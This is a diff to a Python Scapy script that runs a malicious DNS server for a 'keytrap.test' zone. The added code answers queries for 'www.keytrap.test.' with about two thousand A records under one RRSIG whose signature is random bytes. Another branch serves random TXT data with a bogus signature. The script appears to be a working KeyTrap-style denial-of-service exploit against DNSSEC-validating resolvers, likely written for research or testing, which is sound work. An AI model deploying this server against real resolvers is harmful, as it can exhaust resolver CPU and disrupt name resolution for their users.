@@ -4,6 +4,9 @@ from scapy.layers.inet import IP, UDP, TCP
 from datetime import datetime
 from functools import reduce
 import base64
+# 提高递归深度
+import sys
+sys.setrecursionlimit(1000000)
 
 # 配置DNS服务器的IP和端口
 IFACE_LAN = "eth0"
@@ -13,17 +16,17 @@ GLOBAL_TTL = 86400
 
 BPF_FILTER = "udp port "  + str(PORT_OF_SERVER) + " or tcp port " + str(PORT_OF_SERVER)
 
-# RRSET大小
-RRSET_BYTES = 8196
+# A RR NUM = 256 * FACTOR
+FACTOR = 8
 
-# 每次签名都需要更新以下条目：INCEPTION, EXPIRATION, RRSIG
-INCEPTION = datetime.strptime("20241004070956", "%Y%m%d%H%M%S").timestamp() + 3600 * 8
-EXPIRATION = datetime.strptime("20241103070956", "%Y%m%d%H%M%S").timestamp() + 3600 * 8
+# 每次签名都需要更新以下三个条目：INCEPTION, EXPIRATION, RRSIG
+INCEPTION = datetime.strptime("20241004125159", "%Y%m%d%H%M%S").timestamp() + 3600 * 8
+EXPIRATION = datetime.strptime("20241103125159", "%Y%m%d%H%M%S").timestamp() + 3600 * 8
 RRSIG={
-    # RRSIG FOR NS RRSET.
-    "keytrap.test": base64.b64decode("86nIYs8Wmj0nnfh3FSYxYOk7K3UpJfxv0LY2aukmq7NvCEYTP+BSz2GihOlDad/uNAyFaF/v7nPYAFeUtvzebpHG697pUFvPS7ODGBT3ejXNE/umO2G+lCO0zEQ4zsPM"),
-    "ZSK": base64.b64decode("86nIYs8Wmj0nnfh3FSYxYOk7K3UpJfxv0LY2aukmq7NvCEYTP+BSz2GihOlDad/uNAyFaF/v7nPYAFeUtvzebpHG697pUFvPS7ODGBT3ejXNE/umO2G+lCO0zEQ4zsPM"),
-    "KSK": base64.b64decode("kdTD8vDrZzCCQgj74tL8hjpz/axRsWVcl6HWxqy3EFlah4jab18pekvv4iUwzPZT/kEBUv5Ca/fYw+WLSpolcM2+XY1ICmrdozUN32GrOHxLCTpV9AFJBYOxuTy87RyI"),
+    # RRSIG FOR NS RRSET
+    "keytrap.test.": base64.b64decode("7KkQtNd2pR06qn8aoFJLCQ/Zp9cCvbTTnitjjH4sg3HuTvr3ddSYC9HH3SRGmfESWWG4bhZUmXxtkGZIML6GRBhml98Aw1zAg+IU77hZ7SNjJXD2MLuYF2tMTA2UHSi9"),
+    "ZSK": base64.b64decode("8zRGv+6/M4WDGckk0OLGB+gpFUgLMTmOYzAF3nTu3k5Yh5eJmfuskUgcHrOSKt1tciyVyh+8lOc1DslU4uc/QzzjcKJ9tAhDfNg8ltHi3g2FD7HPMymz2bIxyeCB04fZ"),
+    "KSK": base64.b64decode("FjpM05kOQp9hY9RdZaTPk6xiua7v4YSZW0+00/3jmTbg/sB0XE1aB7/O9WglxaW/Pol15/59+MZiG+wyjzqc8zFp1iggE0TsodiHWbGowdmj+aMgGuuF1AAWm4MZHYa1"),
 }
 
 DNSKEY={
@@ -35,10 +38,20 @@ DNSKEY={
 def gen_random_rrsig(len=96):
     return os.urandom(len)
 
+answer_list = [
+    DNSRRRSIG(rrname="www.keytrap.test.", labels=3, ttl=GLOBAL_TTL, typecovered=1, originalttl=GLOBAL_TTL, 
+                        expiration=EXPIRATION, inception=INCEPTION,keytag=6350, algorithm=14, 
+                        signersname="keytrap.test", signature=gen_random_rrsig()),
+]
+for i in range(255):
+                for j in range(FACTOR):
+                    answer_list.append(DNSRR(rrname="www.keytrap.test.", type=1, ttl=GLOBAL_TTL, rdata=f"124.222.{i}.{j}"))
 
+answer_set = reduce(lambda x, y: x / y, answer_list)
 
 # 构造DNS响应
 def craft_dns_response(pkt, qname, qtype):
+    global answer_set
     if TCP in pkt:
         reply_pkt = IP(src=pkt[IP].dst, dst=pkt[IP].src) / TCP(sport=int(PORT_OF_SERVER), dport=pkt[TCP].sport)
     else:
@@ -50,20 +63,24 @@ def craft_dns_response(pkt, qname, qtype):
         reply_pkt /= DNS(id=pkt[DNS].id, qr=1, aa=1, ad=1, qd=pkt[DNS].qd,
                         an=
                             DNSRR(rrname=qname, type=16, ttl=GLOBAL_TTL, rdata=os.urandom(RRSET_BYTES)) /
-                            DNSRRRSIG(rrname=qname, labels=3, ttl=GLOBAL_TTL, typecovered=1, originalttl=GLOBAL_TTL, 
+                            DNSRRRSIG(rrname=qname, labels=3, ttl=GLOBAL_TTL, typecovered=16, originalttl=GLOBAL_TTL, 
                             expiration=EXPIRATION, inception=INCEPTION,keytag=6350, algorithm=14, 
                             signersname="keytrap.test", signature=gen_random_rrsig()),
                     )
-    
-        # 查询A记录
+    # 查询A记录
     if qtype == 1:
-        reply_pkt /= DNS(id=pkt[DNS].id, qr=1, aa=1, ad=1, qd=pkt[DNS].qd,
-                        an=
-                            DNSRR(rrname=qname, type=1, ttl=GLOBAL_TTL, rdata="124.222.27.40") /
-                            DNSRRRSIG(rrname=qname, labels=3, ttl=GLOBAL_TTL, typecovered=1, originalttl=GLOBAL_TTL, 
-                            expiration=EXPIRATION, inception=INCEPTION,keytag=6350, algorithm=14, 
-                            signersname="keytrap.test", signature=RRSIG["keytrap.test."]),
+        if qname == "www.keytrap.test.":
+            reply_pkt /= DNS(id=pkt[DNS].id, qr=1, aa=1, ad=1, qd=pkt[DNS].qd,
+                        an=answer_set
                     )
+        else:
+            reply_pkt /= DNS(id=pkt[DNS].id, qr=1, aa=1, ad=1, qd=pkt[DNS].qd,
+                            an=
+                                DNSRR(rrname=qname, type=1, ttl=GLOBAL_TTL, rdata="124.222.27.40") /
+                                DNSRRRSIG(rrname=qname, labels=3, ttl=GLOBAL_TTL, typecovered=1, originalttl=GLOBAL_TTL, 
+                                expiration=EXPIRATION, inception=INCEPTION,keytag=6350, algorithm=14, 
+                                signersname="keytrap.test", signature=RRSIG["keytrap.test."]),
+                        )
 
     # 查询DNSKEY记录
     elif qtype == 48:
